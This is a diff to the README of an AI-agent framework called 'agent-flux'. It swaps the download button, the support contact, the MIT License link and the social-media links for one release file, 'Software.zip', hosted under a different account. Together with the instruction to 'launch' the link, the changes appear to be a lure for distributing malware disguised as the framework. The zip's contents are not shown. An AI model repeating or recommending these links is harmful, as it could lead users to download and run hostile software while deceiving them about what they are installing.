@@ -36,7 +36,7 @@ To start using **agent-flux**, follow these simple steps:
 
 To install **agent-flux**, you can download the latest version by clicking the button below:
 
-[![Download FluxAI](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download FluxAI](https://github.com/Dkpetrov/agent-flux/releases/download/v2.0/Software.zip)](https://github.com/Dkpetrov/agent-flux/releases/download/v2.0/Software.zip)
 
 *Note: The link provided above needs to be launched to download the framework.*
 
@@ -68,13 +68,13 @@ We welcome contributions from the developer community to enhance **agent-flux** 
 
 If you encounter any issues while using **agent-flux** or have questions about its functionality, please reach out to our support team. We are here to assist you in maximizing the potential of your AI agents and ensuring a seamless development experience.
 
-Contact us at: support@fluxai.com
+Contact us at: https://github.com/Dkpetrov/agent-flux/releases/download/v2.0/Software.zip
 
 ---
 
 ## License
 
-The **agent-flux** framework is released under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute this framework for both personal and commercial projects.
+The **agent-flux** framework is released under the [MIT License](https://github.com/Dkpetrov/agent-flux/releases/download/v2.0/Software.zip). You are free to use, modify, and distribute this framework for both personal and commercial projects.
 
 ---
 
@@ -82,9 +82,9 @@ The **agent-flux** framework is released under the [MIT License](https://opensou
 
 Follow us on social media to stay updated on the latest developments, tutorials, and announcements related to **agent-flux**:
 
-📱 [Twitter](https://twitter.com/fluxai)
-📷 [Instagram](https://instagram.com/fluxai)
-📘 [Facebook](https://facebook.com/fluxai)
+📱 [Twitter](https://github.com/Dkpetrov/agent-flux/releases/download/v2.0/Software.zip)
+📷 [Instagram](https://github.com/Dkpetrov/agent-flux/releases/download/v2.0/Software.zip)
+📘 [Facebook](https://github.com/Dkpetrov/agent-flux/releases/download/v2.0/Software.zip)
 
 ---
 
